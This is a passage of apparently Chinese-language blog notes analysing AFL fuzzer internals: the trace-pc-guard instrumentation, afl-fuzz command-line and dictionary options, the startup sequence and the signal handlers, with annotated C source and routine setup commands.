AFL_USE_MSAN AFL_INST_RATIO; AFL_PATH=. AFL_CC=clang ../afl-clang-fast -funroll-loops  -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign -DAFL_PATH=\&quot;/usr/local/lib/afl\&quot; -DBIN_PATH=\&quot;/usr/local/bin\&quot; -DVERSION=\&quot;2.57b\&quot;  -DUSE_TRACE_PC=1 ../test-instr.c -o test-instr </span></span><br><span class="line"><span class="string">-&gt;</span></span><br><span class="line"><span class="string">clang -fsanitize-coverage=trace-pc-guard -Qunused-arguments -funroll-loops -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign -DAFL_PATH=&quot;/usr/local/lib/afl&quot; -DBIN_PATH=&quot;/usr/local/bin&quot; -DVERSION=&quot;2.57b&quot; -DUSE_TRACE_PC=1 ../test-instr.c -o test-instr -g -O3 -funroll-loops -D__AFL_HAVE_MANUAL_CONTROL=1 -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 -D__AFL_LOOP(_A)=(&#123; static volatile char *_B __attribute__((used));  _B = (char*)&quot;##SIG_AFL_PERSISTENT##&quot;; __attribute__((visibility(&quot;default&quot;))) int _L(unsigned int) __asm__(&quot;__afl_persistent_loop&quot;); _L(_A); &#125;) -D__AFL_INIT()=do &#123; static volatile char *_A __attribute__((used));  _A = (char*)&quot;##SIG_AFL_DEFER_FORKSRV##&quot;; __attribute__((visibility(&quot;default&quot;))) void _I(void) __asm__(&quot;__afl_manual_init&quot;); _I(); &#125; while (0) ../afl-llvm-rt.o </span></span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ifdef AFL_TRACE_PC  </span><br><span class="line">  CFLAGS    += -DUSE_TRACE_PC=<span class="number">1</span>  </span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line">使用 `-flto` 选项，你可以在编译和链接阶段都启用链接时优化。要使用这个选项，需要注意以下几点：</span><br><span class="line"><span class="number">1.</span>  所有涉及的源文件和目标文件都必须启用 `-flto`。</span><br><span class="line"><span class="number">2.</span>  需要使用支持 LTO 的版本的 GCC 或 Clang。</span><br><span class="line"><span class="number">3.</span>  链接阶段可能会增加一些额外的时间和内存消耗，因为编译器需要处理更多的信息。</span><br><span class="line">总之，`-flto` 是一种用于进行全局优化的编译器选项，可以提高生成的可执行文件的性能和效率。</span><br></pre></td></tr></table></figure>

<ul>
<li>跟 <code>AFL_INST_RATIO</code> 不兼容</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> USE_TRACE_PC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_PRIO 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_PRIO 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^USE_TRACE_PC */</span></span></span><br><span class="line"></span><br><span class="line">确保在 `<span class="string">&#x27;trace-pc-guard&#x27;</span>` 模式下，运行时初始化会在 forkserver 初始化之后发生。因为较高的优先级值会在较低优先级的初始化之后执行。这可以避免在初始化过程中出现问题，从而确保所需的顺序。</span><br></pre></td></tr></table></figure>

<h4 id="fsanitize-coverage-trace-pc-guard"><a href="#fsanitize-coverage-trace-pc-guard" class="headerlink" title="-fsanitize-coverage&#x3D;trace-pc-guard"></a>-fsanitize-coverage&#x3D;trace-pc-guard</h4><h5 id="官网介绍"><a href="#官网介绍" class="headerlink" title="官网介绍"></a>官网介绍</h5><ul>
<li>With <code>-fsanitize-coverage=trace-pc-guard</code> the compiler will insert the following code on <strong>every edge</strong>:</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__sanitizer_cov_trace_pc_guard(&amp;guard_variable)</span><br></pre></td></tr></table></figure>

<ul>
<li>Every edge will have its own guard_variable (uint32_t).</li>
<li>The compiler will also insert calls to a module constructor:</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The guards are [start, stop).</span></span><br><span class="line"><span class="comment">// This function will be called at least once per DSO and may be called</span></span><br><span class="line"><span class="comment">// more than once with the same values of start/stop.</span></span><br><span class="line">__sanitizer_cov_trace_pc_guard_init(<span class="type">uint32_t</span> *start, <span class="type">uint32_t</span> *stop);</span><br></pre></td></tr></table></figure>

<ul>
<li>With an additional <code>...=trace-pc,indirect-calls</code> flag <code>__sanitizer_cov_trace_pc_indirect(void *callee)</code> will be inserted on every indirect call.</li>
</ul>
<h5 id="afl实现方法"><a href="#afl实现方法" class="headerlink" title="afl实现方法"></a>afl实现方法</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Init callback. Populates instrumentation IDs. Note that we&#x27;re using</span></span><br><span class="line"><span class="comment">   ID of 0 as a special value to indicate non-instrumented bits. That may</span></span><br><span class="line"><span class="comment">   still touch the bitmap, but in a fairly harmless way. */</span></span><br><span class="line"><span class="type">void</span> __sanitizer_cov_trace_pc_guard_init(<span class="type">uint32_t</span> *start, <span class="type">uint32_t</span> *stop) &#123;</span><br><span class="line">  u32 inst_ratio = <span class="number">100</span>;</span><br><span class="line">  u8 *x;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (start == stop || *start)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  x = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_INST_RATIO&quot;</span>); <span class="comment">// 没有使用 `afl-clang-fast` 进行编译时可以用</span></span><br><span class="line">  <span class="keyword">if</span> (x)</span><br><span class="line">    inst_ratio = <span class="built_in">atoi</span>(x);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!inst_ratio || inst_ratio &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;[-] ERROR: Invalid AFL_INST_RATIO (must be 1-100).\n&quot;</span>);</span><br><span class="line">    <span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure that the first element in the range is always set - we use that</span></span><br><span class="line"><span class="comment">     to avoid duplicate calls (which can happen as an artifact of the underlying</span></span><br><span class="line"><span class="comment">     implementation in LLVM). */</span></span><br><span class="line">  *(start++) = <span class="built_in">R</span>(MAP_SIZE - <span class="number">1</span>) + <span class="number">1</span>;  </span><br><span class="line">  <span class="comment">// 第一个元素总是被设置为非零值。这是为了避免基于 LLVM 实现的底层机制中可能出现的重复调用</span></span><br><span class="line">  <span class="comment">// `R` 可能是一个随机数生成函数，它用于生成一个在 `[0, MAP_SIZE - 1]` 范围内的随机数，然后 `+ 1` 是为了确保不为零</span></span><br><span class="line">  <span class="keyword">while</span> (start &lt; stop) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio)</span><br><span class="line">      *start = <span class="built_in">R</span>(MAP_SIZE - <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">      <span class="comment">// 为当前基本块设置一个随机的非零值，否则将其设置为零。 [0, MAP_SIZE - 1]` 范围内的随机数，然后 `+ 1` </span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      *start = <span class="number">0</span>;</span><br><span class="line">    start++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这个函数在程序初始化时被调用，用于初始化代码覆盖率的相关信息。它会根据一些配置和环境变量来设置代码覆盖率的初始化情况。具体来说：<ul>
<li><code>start</code> 和 <code>stop</code> 参数表示一个范围，用于初始化代码覆盖率数据的位图。这个范围通常涵盖了可执行程序的所有基本块（basic block）。</li>
<li>首先，它会尝试从环境变量中获取 <code>AFL_INST_RATIO</code>，表示代码覆盖率的比率，默认为 100。如果设置了这个值，则按照比率确定哪些基本块需要被标记为被执行。</li>
<li>如果比率设置无效（不在 1-100 范围内），就会输出错误信息并中止程序。</li>
<li>接着，它会确保范围内的第一个元素被设置，以避免重复调用。然后，它会根据比率随机选择基本块进行标记，从而在执行过程中收集代码覆盖率信息。</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The following stuff deals with supporting -fsanitize-coverage=trace-pc-guard.</span></span><br><span class="line"><span class="comment">   It remains non-operational in the traditional, plugin-backed LLVM mode.</span></span><br><span class="line"><span class="comment">   For more info about &#x27;trace-pc-guard&#x27;, see README.llvm.</span></span><br><span class="line"><span class="comment">   The first function (__sanitizer_cov_trace_pc_guard) is called back on every</span></span><br><span class="line"><span class="comment">   edge (as opposed to every basic block). */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __sanitizer_cov_trace_pc_guard(<span class="type">uint32_t</span> *guard) &#123;</span><br><span class="line">  __afl_area_ptr[*guard]++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这个函数是一个回调函数，会在程序执行过程中的每个边界（edge）触发时被调用。<strong>边界指的是基本块（basic block）之间的跳转点</strong>。它的作用是将被执行的边界的计数器递增，从而收集代码覆盖率信息。<code>guard</code> 参数表示一个边界的标识符，会用来索引代码覆盖率数据的位图，将对应的位设置为被访问。</li>
<li>如果我们的edge足够多，而<code>MAP_SIZE</code>不够大，就有可能重复，而这个加一是因为我们会把0当成一个特殊的值，其代表对这个edge不进行插桩。</li>
</ul>
<h2 id="afl-fuzz"><a href="#afl-fuzz" class="headerlink" title="afl-fuzz"></a>afl-fuzz</h2><h3 id="调试配置"><a href="#调试配置" class="headerlink" title="调试配置"></a>调试配置</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&quot;&quot;</span>&gt;/home/wutang/Desktop/fuzz_test/fuzz_input/<span class="number">1</span></span><br><span class="line">echo core &gt;/proc/sys/kernel/core_pattern</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调试</span></span><br><span class="line">afl-fuzz -x /home/wutang/Desktop/fuzz_test/mydict.txt@<span class="number">3</span> -t <span class="number">3600000</span> -M fuzzer1:<span class="number">1</span>/<span class="number">2</span> -i /home/wutang/Desktop/fuzz_test/fuzz_input -o /home/wutang/Desktop/fuzz_test/fuzz_output -- /home/wutang/Desktop/google_afl/llvm_mode/test-instr </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// @@ 指定就传入文件路径 </span></span><br><span class="line"><span class="comment">// 如果无@@ 就标准输入重定向 out_fd 后续就用这个文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">///////////////////////////////////</span></span><br><span class="line">主fuzzer可以多个 可以进行确定性fuzz  ，跟Slave 是一致的 也会skip_deterministic=<span class="number">1</span></span><br><span class="line">-M fuzzer1:<span class="number">1</span>/<span class="number">2</span>   </span><br><span class="line">master_id=<span class="number">1</span></span><br><span class="line">master_max=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">判断是否跳过deteministic fuzzing</span><br><span class="line"><span class="comment">/* Skip deterministic fuzzing if exec path checksum puts this out of scope for this master instance. */</span></span><br><span class="line"><span class="built_in">p</span> (queue_cur-&gt;exec_cksum % <span class="number">5</span>) != <span class="number">5</span> - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">p</span> (<span class="number">3331718982</span> % <span class="number">5</span> != 指定数 <span class="number">-1</span>)</span><br><span class="line">-M fuzzer1:<span class="number">1</span>/<span class="number">5</span>   skip_deterministic=<span class="number">1</span></span><br><span class="line">-M fuzzer1:<span class="number">2</span>/<span class="number">5</span>   skip_deterministic=<span class="number">1</span></span><br><span class="line">-M fuzzer1:<span class="number">3</span>/<span class="number">5</span>   skip_deterministic=<span class="number">0</span></span><br><span class="line">-M fuzzer1:<span class="number">4</span>/<span class="number">5</span>   skip_deterministic=<span class="number">1</span></span><br><span class="line">-M fuzzer1:<span class="number">4</span>/<span class="number">5</span>   skip_deterministic=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">-S Slave1  skip_deterministic=<span class="number">1</span> 直接进行HAVOC</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////// 总结下来就可以用 多主fuzzer 或者用主fuzzer+从fuzzer</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 必须是 llvm_mode下的test-instr</span><br><span class="line">nm test-instr |grep __sanitizer_cov_trace_pc_guard</span><br><span class="line"><span class="number">0000000000424110</span> T __sanitizer_cov_trace_pc_guard</span><br><span class="line"><span class="number">0000000000424140</span> T __sanitizer_cov_trace_pc_guard_init</span><br></pre></td></tr></table></figure>

<h4 id="字典编写规则"><a href="#字典编写规则" class="headerlink" title="字典编写规则"></a>字典编写规则</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 字典文件</span></span><br><span class="line">vim  /home/wutang/Desktop/fuzz_test/mydict.txt</span><br><span class="line"><span class="number">12345678</span> <span class="string">&quot;12345678&quot;</span></span><br><span class="line">key <span class="string">&quot;12345678&quot;</span></span><br><span class="line">ABCD=<span class="string">&quot;ABCD&quot;</span></span><br><span class="line">@<span class="number">2</span> <span class="string">&quot;123&quot;</span></span><br><span class="line">key <span class="string">&quot;\x01ABC&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 字典可以用# 略过</span><br><span class="line"><span class="number">2.</span> key 只是解释，没什么用？</span><br><span class="line"><span class="number">3.</span> 左右两边字符空格略过</span><br><span class="line"><span class="number">4.</span> 后面的字符必须带引号 Malformed name=\<span class="string">&quot;value\&quot; pair in line</span></span><br><span class="line"><span class="string">5. 略过 _ 数字字符</span></span><br><span class="line"><span class="string">6. 空格 或者 = 分割</span></span><br><span class="line"><span class="string">7. 最大token 128</span></span><br><span class="line"><span class="string">8. dict@3 表示字典按 dict_level 为3 来解析</span></span><br><span class="line"><span class="string">9. 它处理了输入字符串中的转义序列，如 `\\` 和 `\xNN`，将其转换为相应的字符值</span></span><br><span class="line"><span class="string">10. `-x/home/wutang/Desktop/fuzz_test/mydict.txt@3` 表示要提取字典级别（level），并将 `@` 之后的数字解析为字典级别 `dict_level`。 好像没什么用</span></span><br></pre></td></tr></table></figure>

<h3 id="初始配置"><a href="#初始配置" class="headerlink" title="初始配置"></a>初始配置</h3><h4 id="所有流程"><a href="#所有流程" class="headerlink" title="所有流程"></a>所有流程</h4><ul>
<li>获取<code>AFL_BENCH_JUST_ONE</code><ul>
<li>设置 exit_1</li>
</ul>
</li>
<li>时间作为随机种子</li>
<li>解析参数<ul>
<li><code>-i</code> 设置 输入为 in_dir<ul>
<li>如果in_dir 是 <code>-</code>  设置 <code>in_place_resume</code>&#x3D;1</li>
<li>If you wish to start a new session, remove or rename the directory manually, or specify a different output location for this job. To resume the old session, put ‘-‘ as the input directory in the command line (<strong>-i -</strong>) and try again.</li>
</ul>
</li>
<li><code>-o</code> 设置 输出为 out_dir</li>
<li><code>-M</code> 用于存储同步标识符. <code>master sync ID </code><ul>
<li>可能存在 <code>123:456</code><ul>
<li>设置 master_id master_max</li>
</ul>
</li>
<li>用于存储同步标识符, 设置 sync_id</li>
<li><code>force_deterministic=1</code> 表示后续的 fuzzing 进程将被强制设置为确定性模式，这是为了确保同步的正确性。</li>
<li>与 <code>-S</code>不能同时指定</li>
</ul>
</li>
<li><code>-S</code> 用于存储同步标识符 <code>Slave fuzzer</code><ul>
<li>用于存储同步标识符, 设置 sync_id</li>
<li>[[#fix_up_sync]] 相关</li>
<li><code>skip_deterministic=1</code> 不进行确定性fuzz 直接到[[#RANDOM HAVOC阶段]]</li>
<li>设置 <code>use_splicing=1</code> Recombine input files 重组输入</li>
</ul>
</li>
<li><code>-n</code> dumb mode模式<ul>
<li><code>Dumb&quot; fork server</code> fork server 不会执行目标程序的初始化代码，而是直接执行测试用例。这样可以快速启动 fork server，但可能会导致目标程序在没有正确初始化的情况下运行，因此可能会遗漏一些重要的程序行为。</li>
<li>这是因为在某些情况下，启动目标程序的初始化代码可能会干扰到 fuzzing 进程的运行，导致无法正常 fuzzing。<ul>
<li>例如，<code>某些目标程序的初始化可能会导致程序崩溃或无法正常退出，从而影响到 fuzzing 的效果</code>。在这种情况下，使用 “dumb” fork server 可以绕过这些问题，快速执行测试用例。</li>
<li>但需要注意，使用 “dumb” fork server 模式<code>可能会忽略一些初始化和环境设置，导致无法模拟真实的运行环境</code>。</li>
</ul>
</li>
</ul>
</li>
<li><code>-d</code><ul>
<li>设置确定模式 <code>skip_deterministic=1</code> 直接去[[#RANDOM HAVOC阶段]]</li>
<li>设置 <code>use_splicing=1</code> Recombine input files 重组输入</li>
</ul>
</li>
<li><code>-x</code>设置字典 extras_dir 还要键值对？</li>
<li><code>-f</code> 可设置目标文件 或者用 <code>@@</code> 指定预料</li>
<li><code>-t</code> 设置exec_tmout</li>
<li><code>-C</code> 设置 <code>FAULT_CRASH</code> 非一般的crash方式？</li>
</ul>
</li>
<li>[[#setup_signal_handlers]]</li>
<li>[[#check_asan_opts]]</li>
<li>[[#fix_up_sync]]</li>
<li><code>AFL_NO_FORKSRV</code>设置 no_forkserver</li>
<li><code>AFL_NO_CPU_RED</code>设置 no_cpu_meter_red<ul>
<li>将禁用 CPU 利用率的自动调整</li>
</ul>
</li>
<li><code>AFL_NO_ARITH</code>设置 no_arith<ul>
<li>将禁用算术变异策略  [[#ARITHMETIC INC&#x2F;DEC阶段]]</li>
</ul>
</li>
<li><code>AFL_SHUFFLE_QUEUE</code>设置 shuffle_queue<ul>
<li>将启用测试用例队列的随机洗牌</li>
</ul>
</li>
<li><code>AFL_FAST_CAL</code>设置 fast_cal<ul>
<li>这里涉及 [[#u8 calibrate_case(char **argv, struct queue_entry *q, u8 *use_mem, u32 handicap, u8 from_queue)]]</li>
<li>默认是3次stage_max</li>
</ul>
</li>
<li><code>AFL_HANG_TMOUT</code>设置 hang_tmout<ul>
<li>将设置程序运行的超时时间，以防止程序进入无限循环或挂起</li>
</ul>
</li>
<li><code>AFL_PRELOAD</code><ul>
<li>将设置 <code>LD_PRELOAD</code> 和 <code>DYLD_INSERT_LIBRARIES</code> 环境变量，用于加载指定的共享库。</li>
</ul>
</li>
<li>[[#save_cmdline]] 到 orig_cmdline</li>
<li>[[#fix_up_banner]] 更新程序的 banner 信息，use_banner 文件路径</li>
<li>[[#check_if_tty]]  检查是否在tty终端上面运行。</li>
<li>[[#get_core_count]] 计数logical CPU cores，多少cpu cores&#x2F;正在使用多少</li>
<li>[[#bind_to_free_cpu]] 找到未被绑定到特定CPU核心的空闲CPU核心，然后将程序绑定到其中一个空闲核心上，以优化性能</li>
<li>[[#check_crash_handling]] 其主要目的是检查系统的崩溃处理设置，以确保在程序运行过程中产生的崩溃不会被外部崩溃报告工具处理，从而影响程序运行和崩溃处理的准确性。</li>
<li>[[#check_cpu_governor]]  检查系统的 CPU 调频策略（CPU Scaling Governor）是否对 Fuzzing 运行有不良影响</li>
<li>[[#setup_post]] 加载后处理器（post-processor）库，并检测后处理器是否成功加载和正常运行，任意语言包括go编译的so</li>
<li>[[#setup_shm]] 主要功能是配置共享内存和初始化 <code>virgin_bits</code> 数组。这些操作在程序启动时进行, 映射内存到本地</li>
<li>[[#init_count_class16]] 定义了一个处理执行计数的函数和两个查找表<code>count_class_lookup8 count_class_lookup16</code>，用于对执行计数进行分类。<ul>
<li>给trace_bits 用的</li>
</ul>
</li>
<li>[[#setup_dirs_fds]] 各种需要的路径创建</li>
<li>[[#read_testcases]] 从输入文件夹中读取所有文件，然后将它们排队进行测试。<ul>
<li>[[#add_to_queue(u8 *fname, u32 len, u8 passed_det)]] 将新的测试用例添加到队列中，以供后续进行测试。</li>
</ul>
</li>
<li>[[#load_auto]]  load自动生成的提取出来的词典token<ul>
<li>[[#maybe_add_auto(u8 *mem, u32 len)]] 是向自动生成的字典中添加新的条目（字典项）</li>
</ul>
</li>
<li>[[#pivot_inputs]] 函数负责将输入测试用例文件重新命名、链接（或拷贝）到输出目录中，并在需要的情况下更新文件名以及关联的信息。这有助于模糊测试过程的组织和恢复</li>
<li>[[#load_extras]]  这段代码负责加载额外的字典文件（extra dictionary）并对其进行排序，使其按照字典条目的大小进行排列</li>
<li>[[#find_timeout]] 寻找之前会话中的超时设置，并将其应用于当前会话</li>
<li>[[#detect_file_args]] 这个函数其实就是识别参数里面有没有<code>@@</code>，如果有就替换为<code>out_dir/.cur_input</code>，如果没有就返回</li>
<li>[[#setup_stdio_file]] 如果out_file为NULL ， 如果没有使用-f  &amp;&amp; 或者没有指定 <code>@@</code>，删除<code>out_dir/.cur_input</code></li>
<li>[[#check_binary]] 它检查二进制文件是否存在、是否为可执行文件、是否为 ELF 或 Mach-O 格式，是否包含 AFL 仪表插装标记，以及其他相关特征。</li>
<li>get_cur_time 记录时间</li>
<li>[[#perform_dry_run]] 尝试去fuzz程序，计算是否符合要求等<ul>
<li>calibrate_case<ul>
<li>init_forkserver</li>
<li>write_to_testcase</li>
<li>run_target</li>
<li>count_bytes</li>
<li>hash32</li>
<li>[[#has_new_bits(u8 *virgin_map)]]</li>
<li>update_bitmap_score</li>
</ul>
</li>
<li>check_map_coverage</li>
</ul>
</li>
<li>[[#cull_queue]] 该函数的目标是在模糊测试期间调整队列，以便更多地探索未被完全探索的路径</li>
<li>[[#show_init_stats]] 这段代码用于在处理输入目录后显示初始化统计信息和一些警告</li>
<li>[[#find_start_position]] resume模式下有意义，其目的是在恢复模式下寻找一个合适的队列起始位置</li>
<li>[[#void write_stats_file(double bitmap_cvg, double stability, double eps)]] 数负责将各项统计信息写入名为 <code>fuzzer_stats</code> 的文件中，这些信息用于监控 fuzzer 的性能和状态。这可以帮助用户了解 fuzzer 的执行情况、性能和资源使用情况</li>
<li>[[#save_auto]]目的是将用于自动筛选的额外测试用例保存到磁盘中。</li>
<li>sleep 4秒</li>
<li>进入循环-fuzzing [[#fuzz-主要流程]]</li>
</ul>
<h4 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h4><ul>
<li>函数负责配置各种信号的信号处理程序，这些信号可能在 AFL fuzzer 运行过程中出现。信号处理程序是在进程接收到特定信号时执行的函数。通过设置适当的信号处理程序，程序可以处理中断、超时和其他可能影响其执行的情况</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Handle stop signal (Ctrl-C, etc). */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">handle_stop_sig</span><span class="params">(<span class="type">int</span> sig)</span> </span>&#123;</span><br><span class="line">  stop_soon = <span class="number">1</span>; </span><br><span class="line">  <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(child_pid, SIGKILL);</span><br><span class="line">  <span class="keyword">if</span> (forksrv_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(forksrv_pid, SIGKILL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Handle timeout (SIGALRM). */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">handle_timeout</span><span class="params">(<span class="type">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    child_timed_out = <span class="number">1</span>; </span><br><span class="line">    <span class="built_in">kill</span>(child_pid, SIGKILL);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (child_pid == <span class="number">-1</span> &amp;&amp; forksrv_pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    child_timed_out = <span class="number">1</span>; </span><br><span class="line">    <span class="built_in">kill</span>(forksrv_pid, SIGKILL);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Handle screen resize (SIGWINCH). */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">handle_resize</span><span class="params">(<span class="type">int</span> sig)</span> </span>&#123;</span><br><span class="line">  clear_screen = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Handle skip request (SIGUSR1). */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">handle_skipreq</span><span class="params">(<span class="type">int</span> sig)</span> </span>&#123;</span><br><span class="line">  skip_requested = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set up signal handlers. More complicated that needs to be, because libc on</span></span><br><span class="line"><span class="comment">   Solaris doesn&#x27;t resume interrupted reads(), sets SA_RESETHAND when you call</span></span><br><span class="line"><span class="comment">   siginterrupt(), and does other unnecessary things. */</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里handle_timeout往后看 [[#init_forkserver设置子进程超时]]</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">setup_signal_handlers</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">sigaction</span> sa;</span><br><span class="line">  <span class="comment">// 函数开始时，创建一个名为 `sa` 的 `struct sigaction`，其中包含有关每个信号所需行为的信息。 官方的</span></span><br><span class="line">  sa.sa_handler   = <span class="literal">NULL</span>;</span><br><span class="line">  sa.sa_flags     = SA_RESTART; </span><br><span class="line">  <span class="comment">// /* Restart syscall on signal return.  */ </span></span><br><span class="line">  sa.sa_sigaction = <span class="literal">NULL</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">sigemptyset</span>(&amp;sa.sa_mask); <span class="comment">// /* Clear all signals from SET.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Various ways of saying &quot;stop&quot;. */</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_stop_sig; </span><br><span class="line">  <span class="comment">// `handle_stop_sig` 函数负责处理这些信号。它启动停止模糊测试程序的过程。</span></span><br><span class="line">  <span class="built_in">sigaction</span>(SIGHUP, &amp;sa, <span class="literal">NULL</span>); </span><br><span class="line">  <span class="comment">// 当终端或会话连接中断时，操作系统会发送 `SIGHUP` 信号给与其相关联的进程。</span></span><br><span class="line">  <span class="built_in">sigaction</span>(SIGINT, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="comment">// 当用户在终端按下 Ctrl + C 时，操作系统会发送 `SIGINT` 信号给前台进程。</span></span><br><span class="line">  <span class="built_in">sigaction</span>(SIGTERM, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="comment">// 当操作系统需要终止进程时，会发送 `SIGTERM` 信号。</span></span><br><span class="line">  <span class="comment">// 对 `SIGHUP`、`SIGINT` 和 `SIGTERM` 调用 `sigaction`，将 `&amp;sa` 作为接收到这些信号时要执行的操作。</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Exec timeout notifications. */</span></span><br><span class="line">  sa.sa_handler = handle_timeout;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGALRM, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="comment">// 在模糊测试中，`SIGALRM` 信号通常用于实现执行超时，以确保程序不会无限期地运行下去。如果程序在规定的时间内未完成执行，操作系统会发送 `SIGALRM` 信号。</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Window resize */</span></span><br><span class="line">  sa.sa_handler = handle_resize;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGWINCH, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="comment">// 当终端窗口大小调整时，操作系统会发送 `SIGWINCH` 信号给相关进程。</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* SIGUSR1: skip entry */</span></span><br><span class="line">  sa.sa_handler = handle_skipreq;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGUSR1, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="comment">// 用户自定义的信号 `SIGUSR1` 信号通常被用来触发特定的操作。在源码中，它被用来跳过当前测试用例的执行。</span></span><br><span class="line">  <span class="comment">// ``c_signal</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Things we don&#x27;t care about. */</span></span><br><span class="line">  sa.sa_handler = SIG_IGN; <span class="comment">// 表示忽略该信号</span></span><br><span class="line">  <span class="built_in">sigaction</span>(SIGTSTP, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="comment">// 通常由用户按下 `Ctrl-Z` 组合键来发送。它会使进程进入停止（暂停）状态，进入后台，并暂停运行。进程在这个状态下可以通过 `fg` 命令恢复运行到前台。</span></span><br><span class="line">  <span class="built_in">sigaction</span>(SIGPIPE, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="comment">// 这是一个在进程尝试写入一个已关闭的写端管道时产生的信号。如果进程忽略这个信号，继续写入已关闭的管道会触发一个 `EPIPE` 错误，而不会中断程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts"></a>check_asan_opts</h4><ul>
<li>这个函数的目的是确保在使用 ASan 和 MSan 运行 AFL-Fuzz 时，相应的运行选项被正确地设置，以便在检测内存错误时能够正常运行。</li>
<li>读取环境变量ASAN_OPTIONS和MSAN_OPTIONS，做一些检查</li>
</ul>
